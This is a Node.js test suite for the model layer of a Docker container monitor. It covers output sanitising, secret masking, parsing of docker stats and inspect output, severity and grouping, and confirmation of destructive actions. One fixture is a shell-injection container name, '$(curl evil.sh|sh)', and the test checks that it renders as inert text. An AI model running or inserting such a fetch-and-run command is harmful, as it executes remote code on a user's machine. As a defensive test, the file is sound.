const assert = require("node:assert/strict");
const fs = require("node:fs");
const vm = require("node:vm");
const test = require("node:test");

const source = fs.readFileSync(new URL("../Model.js", `file://${__dirname}/`), "utf8")
  .replace(/^\.pragma library\s*/m, "");
const model = {};
vm.createContext(model);
vm.runInContext(source, model);

// Model.js runs inside a vm context, so the arrays and objects it returns come
// from a different realm and are never reference-equal to the ones built here.
// deepStrictEqual compares prototypes, so it rejects a structurally identical
// result. Round-tripping through JSON re-creates the value in this realm.
const plain = (value) => JSON.parse(JSON.stringify(value));

// --- Untrusted text ---------------------------------------------------------

test("stripAnsi removes colour codes, OSC strings, and 8-bit CSI", () => {
  assert.equal(model.stripAnsi("\x1b[31mred\x1b[0m"), "red");
  assert.equal(model.stripAnsi("\x1b]0;window title\x07after"), "after");
  assert.equal(model.stripAnsi("\x9b31mred"), "red");
  assert.equal(model.stripAnsi("plain"), "plain");
});

test("sanitize strips control bytes a log line could use to repaint the panel", () => {
  assert.equal(model.sanitize("a\x00b\x08c"), "abc");
  assert.equal(model.sanitize("keep\nnewlines"), "keep\nnewlines");
  // Carriage return is a control byte: without stripping it, a log line can
  // overwrite what was already drawn on the row.
  assert.equal(model.sanitize("first\rsecond"), "firstsecond");
});

test("sanitize caps runaway length", () => {
  const out = model.sanitize("x".repeat(9000), 100);
  assert.equal(out.length, 101);
  assert.ok(out.endsWith("…"));
});

test("sanitizeLine folds newlines so a crafted name cannot fake extra rows", () => {
  assert.equal(model.sanitizeLine("evil\nadmin"), "evil admin");
  assert.equal(model.sanitizeLine("tab\tsep"), "tab sep");
});

test("a shell-injection container name survives as inert text", () => {
  // Kaj never builds shell strings, but the name must also render harmlessly.
  const name = "$(curl evil.sh|sh)";
  assert.equal(model.displayName("/" + name), name);
});

// --- Secrets ----------------------------------------------------------------

test("sensitive env keys are detected regardless of case", () => {
  assert.ok(model.isSensitiveEnvKey("DB_PASSWORD"));
  assert.ok(model.isSensitiveEnvKey("api_key"));
  assert.ok(model.isSensitiveEnvKey("STRIPE_SECRET"));
  assert.ok(model.isSensitiveEnvKey("SESSION_COOKIE"));
  assert.ok(!model.isSensitiveEnvKey("NODE_ENV"));
  assert.ok(!model.isSensitiveEnvKey("PORT"));
});

test("secret-shaped values are caught even under an innocent key", () => {
  assert.ok(model.isSensitiveEnvValue("ghp_abcdefghijklmnopqrst"));
  assert.ok(model.isSensitiveEnvValue("sk-abcdefghijklmnopqrstuv"));
  assert.ok(model.isSensitiveEnvValue("eyJhbGciOiJIUzI1NiJ9xxxx"));
  assert.ok(!model.isSensitiveEnvValue("production"));
});

test("env entries mask by default and split only on the first =", () => {
  const entry = model.envEntry("DATABASE_URL=postgres://u:p@h/db?x=1");
  assert.equal(entry.key, "DATABASE_URL");
  assert.equal(entry.value, "postgres://u:p@h/db?x=1");

  const secret = model.envEntry("DB_PASSWORD=hunter2");
  assert.equal(secret.sensitive, true);
  assert.equal(secret.masked, "••••••••");
  assert.ok(!secret.masked.includes("hunter2"));

  const ordinary = model.envEntry("NODE_ENV=production");
  assert.equal(ordinary.sensitive, false);
  assert.equal(ordinary.masked, "production");
});

// --- Parsing ----------------------------------------------------------------

test("parseJsonLines skips malformed lines instead of failing the refresh", () => {
  const parsed = model.parseJsonLines('{"a":1}\nnot json\n\n{"b":2}');
  assert.deepEqual(plain(parsed), [{ a: 1 }, { b: 2 }]);
});

test("parseJsonLines survives the cursor codes docker stats wraps records in", () => {
  // Verbatim shape of a `docker stats --format '{{json .}}'` line on a pipe:
  // Docker still emits cursor-home/erase codes around every record.
  const raw = '\x1b[H{"ID":"d6f3594ad3a2","CPUPerc":"0.91%","MemUsage":"74.27MiB / 7.628GiB"}\x1b[K\n\x1b[K\n\x1b[J';
  const parsed = model.parseJsonLines(raw);
  assert.equal(parsed.length, 1);
  assert.equal(parsed[0].ID, "d6f3594ad3a2");
  assert.equal(model.normalizeStat(parsed[0]).cpu, 0.91);
});

test("normalizeContainer flattens the inspect payload", () => {
  const raw = {
    Id: "d6f3594ad3a2c7f29efc28a1b34a419314f922235b0d7fe37d8773d6832d9d09",
    Name: "/twitch-drops-miner",
    Created: "2026-08-23T12:00:43.654415099Z",
    State: {
      Running: true, Paused: false, Restarting: false, Dead: false,
      OOMKilled: false, ExitCode: 0, Status: "running",
      StartedAt: "2026-08-24T17:35:53.442426434Z",
      Health: { Status: "healthy" }
    },
    Labels: { "com.docker.compose.project": "media", "com.docker.compose.service": "miner" },
    Image: "dungfu/twitch-drops-miner:latest",
    Ports: { "5800/tcp": [{ HostIp: "0.0.0.0", HostPort: "5800" }, { HostIp: "::", HostPort: "5800" }] },
    RestartCount: 0
  };

  const c = model.normalizeContainer(raw);
  assert.equal(c.shortId, "d6f3594ad3a2");
  assert.equal(c.name, "twitch-drops-miner");
  assert.equal(c.running, true);
  assert.equal(c.health, "healthy");
  assert.equal(c.project, "media");
  assert.equal(c.service, "miner");
  // The v4/v6 pair Docker reports for one -p flag collapses to a single entry.
  assert.equal(c.ports.length, 1);
  assert.equal(c.ports[0].hostPort, 5800);
});

test("a container with no healthcheck reports no health, not unhealthy", () => {
  const c = model.normalizeContainer({ Id: "abc123def456", Name: "/x", State: { Running: true } });
  assert.equal(c.health, "");
  assert.equal(model.containerSeverity(c), "ok");
});

test("parseTime treats Docker's zero timestamp as never", () => {
  assert.equal(model.parseTime("0001-01-01T00:00:00Z"), 0);
  assert.equal(model.parseTime(""), 0);
  assert.ok(model.parseTime("2026-08-24T17:35:53Z") > 0);
});

test("unpublished ports are kept but not browsable", () => {
  const ports = model.normalizePorts({ "80/tcp": null });
  assert.equal(ports.length, 1);
  assert.equal(ports[0].published, false);
  assert.equal(model.browsableUrl(ports[0]), "");
});

test("browsableUrl only links loopback-reachable tcp bindings", () => {
  assert.equal(
    model.browsableUrl({ published: true, protocol: "tcp", hostIp: "0.0.0.0", hostPort: 8080 }),
    "http://localhost:8080"
  );
  assert.equal(
    model.browsableUrl({ published: true, protocol: "tcp", hostIp: "0.0.0.0", hostPort: 443 }),
    "https://localhost:443"
  );
  // Bound to one specific non-loopback interface: shown, but not linked.
  assert.equal(
    model.browsableUrl({ published: true, protocol: "tcp", hostIp: "192.168.1.5", hostPort: 8080 }),
    ""
  );
  assert.equal(
    model.browsableUrl({ published: true, protocol: "udp", hostIp: "0.0.0.0", hostPort: 53 }),
    ""
  );
});

// --- Stats ------------------------------------------------------------------

test("stats strings parse into numbers", () => {
  assert.equal(model.parsePercent("3.49%"), 3.49);
  assert.equal(model.parsePercent("garbage"), 0);
  assert.equal(model.parseSize("74.71MiB"), 74.71 * 1048576);
  assert.equal(model.parseSize("1GB"), 1e9);

  const pair = model.parseUsagePair("74.71MiB / 7.628GiB");
  assert.ok(Math.abs(pair.used - 74.71 * 1048576) < 1);
  assert.ok(Math.abs(pair.limit - 7.628 * 1073741824) < 1);
});

test("mergeStats keys by short id without mutating the previous map", () => {
  const first = model.mergeStats({}, { ID: "abc123def456", CPUPerc: "5%", MemUsage: "10MiB / 1GiB" });
  const second = model.mergeStats(first, { ID: "999888777666", CPUPerc: "1%", MemUsage: "5MiB / 1GiB" });
  assert.equal(Object.keys(first).length, 1);
  assert.equal(Object.keys(second).length, 2);
  assert.equal(second["abc123def456"].cpu, 5);
});

// --- Grouping and severity --------------------------------------------------

function container(overrides) {
  return Object.assign({
    id: "id", shortId: "id", name: "n", image: "i", running: true, paused: false,
    restarting: false, dead: false, oomKilled: false, exitCode: 0, health: "",
    restartCount: 0, startedAt: 0, project: "", service: ""
  }, overrides);
}

test("severity escalates for the states worth interrupting someone about", () => {
  assert.equal(model.containerSeverity(container({})), "ok");
  assert.equal(model.containerSeverity(container({ oomKilled: true })), "error");
  assert.equal(model.containerSeverity(container({ health: "unhealthy" })), "error");
  assert.equal(model.containerSeverity(container({ running: false, exitCode: 1 })), "error");
  assert.equal(model.containerSeverity(container({ restarting: true })), "warn");
  assert.equal(model.containerSeverity(container({ health: "starting" })), "warn");
  // A clean stop is not a problem.
  assert.equal(model.containerSeverity(container({ running: false, exitCode: 0 })), "ok");
});

test("rollup reports the worst container in the set", () => {
  assert.equal(model.rollupSeverity([container({}), container({ restarting: true })]), "warn");
  assert.equal(
    model.rollupSeverity([container({}), container({ restarting: true }), container({ oomKilled: true })]),
    "error"
  );
  assert.equal(model.rollupSeverity([]), "ok");
});

test("groupByProject sorts projects alphabetically and puts standalone last", () => {
  const groups = model.groupByProject([
    container({ name: "loose", project: "" }),
    container({ name: "web", project: "zeta", service: "web" }),
    container({ name: "db", project: "alpha", service: "db" })
  ]);
  assert.deepEqual(plain(groups.map(g => g.project)), ["alpha", "zeta", ""]);
  assert.equal(groups[2].standalone, true);
  assert.equal(groups[0].running, 1);
  assert.equal(groups[0].total, 1);
});

test("hideStopped hides the boring ones but never the evidence", () => {
  const list = [
    container({ name: "up", running: true }),
    container({ name: "clean", running: false, exitCode: 0 }),
    container({ name: "crashed", running: false, exitCode: 1 }),
    container({ name: "oom", running: false, oomKilled: true })
  ];
  assert.equal(model.visibleContainers(list, false).length, 4);
  // A cleanly stopped container is hidden; a crash and an OOM kill are not.
  assert.deepEqual(
    plain(model.visibleContainers(list, true).map(c => c.name)),
    ["up", "crashed", "oom"]
  );
});

test("containers sort running first, then by service name", () => {
  const group = model.groupByProject([
    container({ project: "p", service: "b", running: true }),
    container({ project: "p", service: "a", running: false }),
    container({ project: "p", service: "c", running: true })
  ])[0];
  assert.deepEqual(plain(group.containers.map(c => c.service)), ["b", "c", "a"]);
});

// --- Formatting -------------------------------------------------------------

test("formatUptime is compact at every scale", () => {
  const now = 1000000000000;
  assert.equal(model.formatUptime(now - 30 * 1000, now), "30s");
  assert.equal(model.formatUptime(now - 5 * 60 * 1000, now), "5m");
  assert.equal(model.formatUptime(now - 90 * 60 * 1000, now), "1h 30m");
  assert.equal(model.formatUptime(now - 50 * 3600 * 1000, now), "2d 2h");
  assert.equal(model.formatUptime(0, now), "");
});

test("formatBytes and formatPercent stay short enough for a bar popup", () => {
  assert.equal(model.formatBytes(0), "0 B");
  assert.equal(model.formatBytes(999), "999 B");
  assert.equal(model.formatBytes(1500), "1.5 KB");
  assert.equal(model.formatBytes(78336000), "78.3 MB");
  assert.equal(model.formatPercent(3.49), "3.5%");
  assert.equal(model.formatPercent(42.7), "43%");
});

test("statusSummary leads with the reason a container is not running", () => {
  assert.equal(model.statusSummary(container({ oomKilled: true })), "Out of memory");
  assert.equal(model.statusSummary(container({ running: false, exitCode: 137 })), "Exited (137)");
  assert.equal(model.statusSummary(container({ running: false, exitCode: 0 })), "Stopped");
  assert.equal(model.statusSummary(container({ restarting: true, restartCount: 3 })), "Restarting ×3");
  assert.equal(model.statusSummary(container({ paused: true })), "Paused");
});

test("barSummary answers the glance question", () => {
  assert.equal(model.barSummary([]), "No containers");
  assert.equal(model.barSummary([container({}), container({ running: false })]), "1 of 2 running");
});

// --- Actions ----------------------------------------------------------------

test("available actions never contradict container state", () => {
  assert.ok(model.availableActions(container({ running: true })).includes("stop"));
  assert.ok(!model.availableActions(container({ running: true })).includes("start"));
  assert.ok(model.availableActions(container({ running: false })).includes("start"));
  assert.ok(!model.availableActions(container({ running: false })).includes("stop"));
  // Removing a running container is not offered at all.
  assert.ok(!model.availableActions(container({ running: true })).includes("remove"));
  assert.ok(model.availableActions(container({ paused: true, running: true })).includes("unpause"));
});

test("only genuinely destructive verbs require confirmation", () => {
  assert.ok(model.isDestructive("remove"));
  assert.ok(model.isDestructive("removeVolumes"));
  assert.ok(model.isDestructive("prune"));
  // Friction on routine verbs is what teaches people to click through the
  // dialog that actually matters.
  assert.ok(!model.isDestructive("stop"));
  assert.ok(!model.isDestructive("restart"));
  assert.ok(!model.isDestructive("start"));
});

test("confirm text names the container and what is lost", () => {
  const c = container({ name: "api" });
  assert.ok(model.confirmText("remove", c).includes("api"));
  assert.ok(model.confirmText("remove", c).includes("volumes are kept"));
  assert.ok(model.confirmText("removeVolumes", c).includes("lost"));
  assert.equal(model.confirmVerb("remove"), "Remove");
});
